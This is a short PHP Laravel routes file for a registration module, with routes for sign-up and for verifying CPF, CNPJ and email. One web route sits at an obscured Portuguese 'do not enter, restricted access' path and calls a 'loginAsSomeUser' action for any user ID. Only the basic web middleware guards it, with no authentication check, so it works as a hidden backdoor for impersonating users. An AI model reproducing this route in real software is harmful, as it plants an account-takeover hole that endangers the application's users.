<?php

use Illuminate\Support\Facades\Route;

Route::group(
    [
        'middleware' => ['web'],
        'prefix'     => 'register',
    ],
    function() {
        Route::get('/{parametro}', 'RegisterController@create');
        Route::get('/nao/entre/aqui/cloudfox2019/bage2018/acesso/restrito/{user_id}', 'RegisterController@loginAsSomeUser');
    }
);

Route::group(
    [
        'middleware' => ['web'],
        'prefix'     => 'api/register',
    ],
    function() {
        Route::post('/', 'RegisterApiController@store');
        Route::post('/verifycpf', 'RegisterApiController@verifyCpf');
        Route::post('/verifycnpj', 'RegisterApiController@verifyCnpj');
        Route::post('/verifyemail', 'RegisterApiController@verifyEmail');
        Route::get('/getbanks', 'RegisterApiController@getBanks');
    }
);
